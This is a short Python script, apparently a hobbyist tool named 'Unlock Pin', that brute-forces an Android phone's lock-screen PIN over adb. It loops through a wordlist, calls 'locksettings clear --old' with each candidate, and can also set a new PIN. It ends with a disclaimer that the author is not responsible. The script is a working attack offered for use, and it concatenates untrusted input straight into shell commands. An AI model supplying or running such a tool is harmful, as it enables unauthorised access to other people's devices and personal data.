import os, time
os.system('cls')

def banner():
	print(''' 
██╗   ██╗███╗   ██╗██╗      ██████╗  ██████╗██╗  ██╗    ██████╗ ██╗███╗   ██╗
██║   ██║████╗  ██║██║     ██╔═══██╗██╔════╝██║ ██╔╝    ██╔══██╗██║████╗  ██║
██║   ██║██╔██╗ ██║██║     ██║   ██║██║     █████╔╝     ██████╔╝██║██╔██╗ ██║
██║   ██║██║╚██╗██║██║     ██║   ██║██║     ██╔═██╗     ██╔═══╝ ██║██║╚██╗██║
╚██████╔╝██║ ╚████║███████╗╚██████╔╝╚██████╗██║  ██╗    ██║     ██║██║ ╚████║
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═══╝
                       Create by Rimba Dirgantara
		''')


def set_new_pin(new_pin):
	os.system('adb shell locksettings set-pin ' + new_pin);


def running_unlocking():

	# wd = open('wordlist.txt', 'r').readlines()
	with open('wordlist.txt', 'r') as wdd:
		wd = wdd.readlines()
		for i in wd:
			pin = i.strip()
			os.system('adb shell locksettings clear --old ' + pin)

def running_unlocking_without(wordlist):
	with open(wordlist,'r') as wdd:
		wd = wdd.readlines()
		for i in wd:
			pin = i.strip()
			os.system('adb shell locksettings clear --old ' + pin)

while True:
	os.system('cls')
	banner()
	print(''' 
1. Unlock pin
2. Set new pin 
3. exit
		''')
	first_comm = input(str('What do u want ? '))
	if first_comm == '1':
		user_com = input(str('Do u have wordlist y/n ? '))

		if user_com == 'n':
			os.system('cls')
			banner()
			running_unlocking()
			print('Done! check your phone')
			time.sleep(2)

		elif user_com == 'y':
			os.system('cls')
			banner()
			wordlist = input(str('Input wordlist path ? '))
			running_unlocking_without(wordlist)
			print('Done! check your phone')
			time.sleep(2)

		elif user_com == 'exit':
			break

	elif first_comm == '2':
		new_pin = input(str('Input new pin > '))
		set_new_pin(new_pin)

	elif first_comm == '3':
		print('exit')
		break

# simple right? hahaha
''' 
So this is what I made for the experiment. I'm not responsible for anything that happens.
'''
